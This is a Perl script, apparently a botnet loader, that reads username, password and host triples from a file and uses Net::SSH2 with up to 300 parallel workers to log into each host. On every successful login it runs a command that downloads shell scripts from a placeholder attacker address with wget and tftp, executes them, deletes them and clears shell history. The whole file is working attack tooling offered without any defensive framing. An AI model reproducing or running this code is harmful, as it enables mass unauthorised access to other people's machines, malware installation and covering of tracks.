#!/usr/bin/perl
use Net::SSH2; use Parallel::ForkManager;
#
# __ __|                  _)       
#    |   __|  _` |   _` |  |   __| 
#    |  |    (   |  (   |  |  (    
#   _| _|   \__,_| \__, | _| \___| 
#                  |___/          
#
open(fh,'<','vuln.txt'); @newarray; while (<fh>){ @array = split(':',$_); 
push(@newarray,@array);
}
# make 10 slaves
my $pm = new Parallel::ForkManager(300); for (my $i=0; $i < 
scalar(@newarray); $i+=3) {
        # fork a slave
        $pm->start and next;
        $a = $i;
        $b = $i+1;
        $c = $i+2;
        $ssh = Net::SSH2->new();
        if ($ssh->connect($newarray[$c])) {
                if ($ssh->auth_password($newarray[$a],$newarray[$b])) {
                        $channel = $ssh->channel();
                        $channel->exec('cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://IP HERE/bins.sh; chmod 777 *; sh bins.sh; tftp -g IP HERE -r tftp.sh; chmod 777 *; sh tftp.sh; rm -rf *.sh; history -c');
                        sleep 10;
                        $channel->close;
                        print "\x1b[1;33m[\x1b[31mSSH\x1b[1;33m] \x1b[31mCommanding \x1b[1;33m->  \x1b[31m".$newarray[$c]."";
                } else {
                        print "\x1b[90mCan't Authenticate Host $newarray[$c]";
                }
        } else {
                print "\x1b[90mCant Connect To Host $newarray[$c]";
        }
        # exit worker
        $pm->finish;
}
$pm->wait_all_children;